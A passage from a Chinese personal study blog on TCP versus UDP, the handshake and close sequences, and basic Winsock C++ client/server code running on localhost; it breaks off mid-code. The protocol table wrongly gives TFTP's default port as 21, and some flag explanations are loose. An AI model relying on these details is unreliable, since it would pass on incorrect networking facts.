id="拥塞、流量控制"><a href="#拥塞、流量控制" class="headerlink" title="拥塞、流量控制"></a>拥塞、流量控制</h3><ol><li>tcp有拥塞和流量控制机制，保证数据安全</li><li>udp没有，所以网络堵不堵塞也不影响这老小子发送</li></ol><hr><h3 id="首部开销"><a href="#首部开销" class="headerlink" title="首部开销"></a>首部开销</h3><p>因为传输层的传输单位称为<code>包</code>，包的头部，也称首部，存放了相应的信息</p><ol><li>tcp的首部长度最小占用20个字节，其中tcp的包有一个选项字段，是可选的，如果选用了，那么这个包头肯定大于20个字节</li><li>udp的首部长度占用8个字节，固定不变。</li></ol><blockquote><p>关于tcp和udp的包结构</p></blockquote><hr><h3 id="分片机制"><a href="#分片机制" class="headerlink" title="分片机制"></a>分片机制</h3><ol><li>tcp的数据如果大于mss大小，就会在传输层的时候分片，当主机收到后在传输层进行组装，如果丢片了，就重写发这一部分</li><li>udp的数据如果大于mtu大小，则会在网络层分片，主机收到后也同样在网络层组装，再由传输层转发。</li></ol><blockquote><p>MTU：maximum transmission unit，最大传输单元，由硬件规定，如以太网的MTU为1500字节。<br>MSS：maximum segment size，最大分节大小，为TCP数据包每次传输的最大数据分段大小，一般由发送端向对端TCP通知对端在每个分节中能发送的最大TCP数据。MSS值为MTU值减去IPv4 Header（20 Byte）和TCP header（20 Byte）得到</p></blockquote><hr><h3 id="二者应用场景"><a href="#二者应用场景" class="headerlink" title="二者应用场景"></a>二者应用场景</h3><p>所以对于可靠的tcp而言，常见的服务有</p><ul><li>ftp   文件传输服务</li><li>http&#x2F;https   web服务</li><li>SMTP&#x2F;POP3 邮件服务</li></ul><p>对于udp这个老小子随时发送的特性，多用于</p><ul><li>dns</li><li>音视频</li><li>广播通信</li></ul><blockquote><p>对于可不可靠个人感觉还是相对的概念，tcp也不见得一定稳，毕竟描述都是理想情况下</p></blockquote><p>了解一下常用协议的信息</p><table><thead><tr><th>协议</th><th>名称</th><th align="center">默认端口</th><th>底层协议</th></tr></thead><tbody><tr><td>HTTP</td><td>超文本传输协议</td><td align="center">80</td><td>TCP</td></tr><tr><td>HTTPS</td><td>超文本传输安全协议</td><td align="center">443</td><td>TCP</td></tr><tr><td>Telnet</td><td>远程登录服务的标准协议</td><td align="center">23</td><td>TCP</td></tr><tr><td>FTP</td><td>文件传输协议</td><td align="center">20传输和21连接</td><td>TCP</td></tr><tr><td>TFTP</td><td>简单文件传输协议</td><td align="center">21</td><td>UDP</td></tr><tr><td>SMTP</td><td>简单邮件传输协议（发送用）</td><td align="center">25</td><td>TCP</td></tr><tr><td>POP</td><td>邮局协议（接收用）</td><td align="center">110</td><td>TCP</td></tr><tr><td>DNS</td><td>域名解析服务</td><td align="center">53</td><td>服务器间进行域传输的时候用TCP 客户端查询DNS服务器时用UDP</td></tr></tbody></table><hr><h3 id="tcp三次握手、四次挥手"><a href="#tcp三次握手、四次挥手" class="headerlink" title="tcp三次握手、四次挥手"></a>tcp三次握手、四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>是指在建立tcp连接的时候，客户端和服务端共发送三个包，以确定双方收发正常给后面传输做准备，说白了就是ip和端口我都要！<br>先不说代码：<br>服务端首先要处于监听状态（listen）<br>第一次握手的时候，客户端给服务端发送一个SYN报文，等待服务器确定，客户端此时就处于一个SYN_SENT状态<br>第二次握手，服务器收到SYN包，确认客户端发来的SYN，同时服务端自己也发个SYN(SYN+ACK)包给客户端做应答，然后服务端处于一个SYN_RECV状态<br>第三次握手，客户端收到服务端的SYN包(SYN+ACK)，向服务器发送确认包ACK，这个包发送完毕之后，客户端和服务端都进入一个ESTABLISHED（TCP连接成功）状态，此时双方成功建立连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">百科copy来的，但是编程的时候好像感知不强啊，先放着有用到再说</span><br><span class="line">（1）未连接队列</span><br><span class="line">在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（seq=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于 Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 [3] </span><br><span class="line">（2）Backlog参数</span><br><span class="line">三次握手协议</span><br><span class="line">三次握手协议</span><br><span class="line">表示内核为相应套接字排队的最大连接个数。SYN-ACK重传次数服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。 [3] </span><br><span class="line">（3）半连接存活时间</span><br><span class="line">是指半连接队列的条目存活的最长时间，也即服务器从收到SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间</span><br></pre></td></tr></table></figure><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>第一步，因为tcp属于全双工状态，所以服务端和客户端都可以发起，此处以ab区分，主机a的tcp数据发完之后，向主机b发送一个带FIN标记的报文，说我东西发完了啊<br>第二步，主机b收到这个FIN报文，它不会立即关闭，而是发个ACK给主机a，问他确认要关闭了吧? 然后主机b处于close_wait状态等着<br>第三步，主机a收到ack之后，在发送一个FIN报文，告诉他我要彻底关闭了！你也可以断了！<br>第四步，主机b收到了这个FIN报文之后，给主机发个ACK，说那没事了，我真的关了，然后大概有一个2MSL的延迟等待之后，彻底over。</p><blockquote><p>MSL是Maximum Segment Lifetime的英文缩写，可译为“最长报文段寿命”，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃</p></blockquote><p><strong>我自己不专业的理解：</strong></p><ol><li>关于握手为啥要三次，也是确认客户端和服务端收发一切正常。通过第一次握手，客户端发送SYN，能知道客户端可以发送，服务端可以接收；第二次握手的时候服务端会发送自己的SYN+ACK给客户端，那么服务端的收发都ok；如果服务端没有收到，应该是有重传机制的，具体多少次之后还没有反应，那么服务端就要关闭连接，关闭端口，以此减少开销。最后还要确认客户端的发送；所以第三握手的时候，客户端发送ACK应答。</li><li>关于挥手为什么要四次，感觉也是跟这个报文有关，连接的时候通过SYN+ACK嘛，SYN是用来建立同步的，ACK是用来应答的。而挥手所使用的FIN则是表示关闭的，配合ACK。当然收到FIN报文之后，socket其实不会立刻关闭，我们得给他一个时间，最合理的时机就是通过一问一答，拆分两次来完成挥手。</li></ol><blockquote><p>TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控 TCP 的状态机的， 依次为 URG，ACK，PSH，RST，SYN，FIN<br>所以说上述中提到的SYN和FIN和ACK都是置为1的时候才说明连接没有问题</p></blockquote><p><strong>更细的概念请自行查阅文档，因为他们有介绍这个码位的细节，严格来说是tcp包的设计。同样的因为编程语言能控制的没有这么深，所以自己没能完全看进去，属于点到为止了</strong></p><p>我也有参考这篇<a href="http://t.zoukankan.com/viviane-p-11713253.html">文章</a></p><hr><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><ol><li>模拟的话肯定是要模拟c&#x2F;s架构也就是客户端和服务器</li><li>cpp的socket编程，不了解的先翻阅资料，我们称为套接字</li><li>tcp和udp是不同的协议，所以实现也不相同</li></ol><p><code>**: error C4996: &#39;inet_addr&#39;: Use inet_pton() or InetPton() instead or define _WINSOCK_DEPRECATED_NO_WARNINGS to disable deprecated API warnings**</code></p><p>出现这个问题，直接在项目属性-c&#x2F;c++-预处理器-预处理器定义里面把<code>_WINSOCK_DEPRECATED_NO_WARNINGS</code>添加进去，记得用分号隔开。</p><p>或者在源文件里面开头加一句<code>#pragma warning(disable:4996)</code></p><hr><h3 id="tcp的demo"><a href="#tcp的demo" class="headerlink" title="tcp的demo"></a>tcp的demo</h3><ol><li>tcp的服务端需要的操作</li></ol><ul><li>创建套接字socket</li><li>绑定客户端地址信息socketaddr_int和bind</li><li>监听连接listen</li><li>accept，也就是从监听的队列取出第一个然后连接</li><li>收发 recv和send</li></ul><ol start="2"><li>客户端需要的操作</li></ol><ul><li>创建套接字</li><li>设置服务器地址信息</li><li>连接客户端 connect</li><li>收发 recv和send</li></ul><p><strong>套接字需要手动关闭，包括socket环境也要清理</strong><br>现今所用的头文件应该都是<code>Winsocke2.h</code>了<br>另外注意目前还是使用ipv4为主</p><p>先搞个最简单的收发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wsa;</span><br><span class="line">SOCKET m_server;</span><br><span class="line">SOCKET m_client;</span><br><span class="line">SOCKADDR_IN serAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化winsock2.2版本</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wsastartup error!\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">m_server = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_server) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//网络地址信息</span></span><br><span class="line">serAddr.sin_family = AF_INET;</span><br><span class="line">serAddr.sin_port = <span class="built_in">htons</span>(<span class="number">7985</span>);</span><br><span class="line">serAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//套接字和地址绑定</span></span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">bind</span>(m_server, (sockaddr*)&amp;serAddr, <span class="built_in">sizeof</span>(SOCKADDR_IN));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//套接字监听</span></span><br><span class="line">ret = <span class="built_in">listen</span>(m_server, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//挂起等待客户端连接</span></span><br><span class="line"><span class="type">int</span> cli_Size = <span class="built_in">sizeof</span>(sockaddr_in);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == (m_client = <span class="built_in">accept</span>(m_server, (sockaddr*)&amp;serAddr, &amp;cli_Size))) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有连接之后发送个数据过去</span></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello client&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结束退出</span></span><br><span class="line"><span class="built_in">closesocket</span>(m_server);</span><br><span class="line"><span class="built_in">closesocket</span>(m_client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wsa;</span><br><span class="line">SOCKET m_sock;</span><br><span class="line">sockaddr_in addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化网络环境</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wsastartup error!\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字，流对象，协议Tcp</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置完地址之后尝试连接</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = <span class="built_in">htons</span>(<span class="number">7985</span>);</span><br><span class="line">addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(m_sock, (sockaddr*)&amp;addr, <span class="built_in">sizeof</span>(sockaddr_in))) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect error!\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收服务端数据</span></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;<span class="comment">//接收数据缓冲区</span></span><br><span class="line"><span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client recvbuf:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭客户端</span></span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在visual studio 上跑就行，分开两个项目只是为了更好理解，如果抽象能力足够，放到一个项目下也行。<br>此外现在也只是单线程的工作收发就结束了还可以互动一下。</p></blockquote><p><strong>有个建议也是约定俗成的，就是if判断的时候把变量放在右边，常量放在左边。也就是上面代码if的时候的操作。虽然对于我们人类阅读有点不便，但是它可以防止最常见的错误<code>if(a=0)</code>，就是判断变成赋值的时候，这样子是合法的不报错但是偏离我们意愿了。改成<code>if(0=a)</code>编译器立马就能给出反应</strong></p><img src="/2022/10/25/tcp-ip/000.png" class=""><p>大致就是这样服务端因为send很快就结束了，客户端则是需要一丢丢时间收到数据然后打印出来<br>这里演示的是服务端发送，客户端接收。<br>那么相应的，一收一发也很简单，加个缓冲区和过程就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有连接之后发送个数据过去</span></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello client&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">recv</span>(m_client, recvBuf, <span class="built_in">sizeof</span>(recvBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server recv:%s\r\n&quot;</span>, recvBuf);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接收服务端数据</span></span><br><span class="line"><span class="type">char</span> recvBuf[MAX_PATH] = <span class="string">&quot;&quot;</span>;<span class="comment">//接收数据缓冲区</span></span><br><span class="line"><span class="built_in">recv</span>(m_sock, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client recvbuf:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> sendBuf[MAX_PATH] = <span class="string">&quot;hello server&quot;</span>;<span class="comment">//发送数据缓冲区</span></span><br><span class="line"><span class="built_in">send</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;client sendbuf！\r\n&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/001.png" class=""><p>甚至无聊点还可以<code>while(true)</code>持续的收发收发。那么到此基础的网络就形成了</p><ol><li>关于变量命名，驼峰和匈牙利命名法可以多学习</li><li>判断的时候右值放前面有助于写错或者忘记，虽然可能不习惯，这个无伤大雅</li><li>加个sleep是怕套接字挂的太快哈哈，实际应该没啥大事</li></ol><p>有关参数我这也粗略描写，具体你在vs上让光标处于这个函数上然后按f1可以跳转到微软的文档，有些可能有中文，没有的就需要翻译一下了。</p><p>关于WSAData，本质是一个结构体，微软都会做一些区分，咱这默认就用两个WORD那个就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">WSAData</span> &#123;</span><br><span class="line">        WORD                    wVersion;</span><br><span class="line">        WORD                    wHighVersion;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;</span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;</span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;</span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; WSADATA, FAR * LPWSADATA;</span><br></pre></td></tr></table></figure><p>在文档中，微软也有示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"> </span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>( <span class="number">2</span>, <span class="number">2</span> );</span><br><span class="line"> </span><br><span class="line">err = <span class="built_in">WSAStartup</span>( wVersionRequested, &amp;wsaData );</span><br><span class="line"><span class="keyword">if</span> ( err != <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line">    <span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们也可以直接缩写成<code>WSAStartup(MAKEWORD(2, 2), &amp;wsa)</code>。<br>关于版本在 wHighVersion 成员中返回的 Windows 套接字规范的当前版本<br>WSADATA 结构是版本 2.2，编码为低字节中的主版本号和高字节中的次要版本号。 此版本的当前 Winsock DLL （Ws2_32.dll）支持请求以下任意版本的 Windows 套接字规范的应用程序：</p><ul><li>1.0</li><li>1.1</li><li>2.0</li><li>2.1</li><li>2.2</li></ul><p>关于SOCKET，也是个小问题，微软会对一些类型命名成全大写的存在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SOCKET WSAAPI <span class="title">socket</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> af,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> type,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span> protocol</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数1位地址簇规范，即ipv4和ipv6，可能有点小区别，见文档<br>参数2表示套接字类型，一般都用流，反正这些基本都是预定义的宏，稍微记住就行。<br>参数3位使用协议，咱这因为是tcp演示，就指明是tcp了。默认为0，代表服务提供者自动协商。</p><p>关于sockaddr_in，通过代码，应该明确知道就是存放地址细节的一个结构体<br>参数1，根据注释此成员应该一直为AF_INET，后续的socket创建也有这个<br>参数2，就是端口号<br>参数3，就是ip的点分十进制方法</p><p><strong>ok，只要你能自己尝试写一下，然后看看这些参数，翻阅文档，那么基本使用套接字就没啥问题了</strong></p><p>然后就是最基本的一问一答，你也可以设置关键字退出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">//接收数据</span></span><br><span class="line">    <span class="built_in">recv</span>(m_client, recvBuf, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//判断是否触发关键字</span></span><br><span class="line">    <span class="keyword">if</span> (recvBuf[<span class="number">0</span>] == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;client quit!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;client msg:%s\r\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;server:&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sendBuf;</span><br><span class="line">    <span class="comment">//发送</span></span><br><span class="line">    <span class="built_in">send</span>(m_client, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;server sendbuf！\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;client:&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sendBuf;</span><br><span class="line">    <span class="comment">//发送</span></span><br><span class="line">    <span class="built_in">send</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//判断是否输入关键字</span></span><br><span class="line">    <span class="keyword">if</span> (sendBuf[<span class="number">0</span>] == <span class="string">&#x27;q&#x27;</span> &amp;&amp; <span class="built_in">strlen</span>(sendBuf) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span 